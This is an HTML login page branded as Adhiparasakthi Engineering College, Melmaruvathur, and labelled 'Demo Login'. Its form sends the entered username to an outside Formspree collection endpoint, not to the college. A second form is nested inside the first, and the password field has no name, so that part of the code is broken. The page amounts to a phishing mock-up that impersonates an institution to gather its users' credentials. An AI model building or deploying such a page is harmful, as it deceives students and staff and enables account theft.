<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Adhiparasakthi Engineering College - Demo Login</title>

<style>
body{
    margin:0;
    padding:0;
    background:#f5f5f5;
    font-family:Arial, sans-serif;
}

.container{
    width:400px;
    margin:60px auto;
    background:white;
    border:2px solid #cc0000;
    border-radius:15px;
    padding:30px;
    text-align:center;
    box-shadow:0 0 15px lightgray;
}

img{
    width:140px;
    height:140px;
}

h2{
    color:#cc0000;
    margin-top:10px;
}

h3{
    color:#555;
}

input{
    width:90%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:5px;
    font-size:16px;
}

button{
    width:96%;
    padding:12px;
    background:#cc0000;
    color:white;
    border:none;
    border-radius:5px;
    font-size:18px;
    cursor:pointer;
}

button:hover{
    background:#990000;
}
</style>
</head>

<body>

<div class="container">

    <img src="Logo.jfif" alt="College Logo">

    <h2>ADHIPARASAKTHI ENGINEERING COLLEGE</h2>
    <h3>Melmaruvathur</h3>

    <form action="https://formspree.io/f/xaqglzap" method="POST">

        <input
            type="text"
            name="username"
            placeholder="Username"
            required>

        <form action="https://formspree.io/f/mlgyokaa" method="post">
            <input
            type="password"
            placeholder="Password "
            required>

        <button type="submit">Login</button>

    </form>

</div>

</body>
</html>
